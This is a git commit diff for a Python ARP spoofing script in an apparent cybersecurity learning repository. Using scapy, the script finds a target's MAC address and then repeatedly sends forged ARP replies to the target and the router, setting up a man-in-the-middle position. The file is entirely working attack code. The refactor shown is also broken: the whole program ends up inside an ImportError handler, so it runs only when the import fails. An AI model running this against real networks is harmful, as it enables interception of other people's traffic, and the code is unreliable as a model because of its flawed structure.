2729e4d93dd39f911ebc058f7320d4c21dded589
tylerkain <tyler.kain@outlook.com>
2023-04-22 09:40:45 -0500

    refactor: added exception handling

--- CyberSecurity-Program/arp_spoof.py
+++ CyberSecurity-Program/arp_spoof.py
@@ -1,32 +1,37 @@
 #!/usr/bin/env python 3
 import time
-
-import scapy.all as scapy
-
-ip = input("enter target ip: ")
-router_ip = input("router IP: ")
-program = True
-packet_count = 0
+try:
+    import scapy.all as scapy
+except ImportError:
 
 
-def scan(ip):
-    """Scan Network For Connected Devices"""
-    arp_request = scapy.ARP(pdst=ip)
-    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
-    arp_request_broadcast = broadcast / arp_request
-    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
-    return answered_list[0][1].hwsrc
+    ip = input("enter target ip: ")
+    router_ip = input("router IP: ")
+    program = True
+    packet_count = 0
 
 
-def create_packet(target_ip, spoof_ip):
-    MAC = scan(target_ip)
-    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=MAC, psrc=spoof_ip)
-    scapy.send(packet)
+    def scan(ip):
+        """Scan Network For Connected Devices"""
+        arp_request = scapy.ARP(pdst=ip)
+        broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
+        arp_request_broadcast = broadcast / arp_request
+        answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
+        return answered_list[0][1].hwsrc
 
 
-while program:
-    packet_count +=2
-    create_packet(ip, router_ip)
-    create_packet(router_ip, ip)
-    time.sleep(2)
-    print(f"packets sent: {packet_count}")
+    def create_packet(target_ip, spoof_ip):
+        MAC = scan(target_ip)
+        packet = scapy.ARP(op=2, pdst=target_ip, hwdst=MAC, psrc=spoof_ip)
+        scapy.send(packet)
+
+
+    while program:
+        try:
+            packet_count +=2
+            create_packet(ip, router_ip)
+            create_packet(router_ip, ip)
+            time.sleep(2)
+            print(f"packets sent: {packet_count}")
+        except KeyboardInterrupt:
+            print("ctrl + c pressed... quitting")
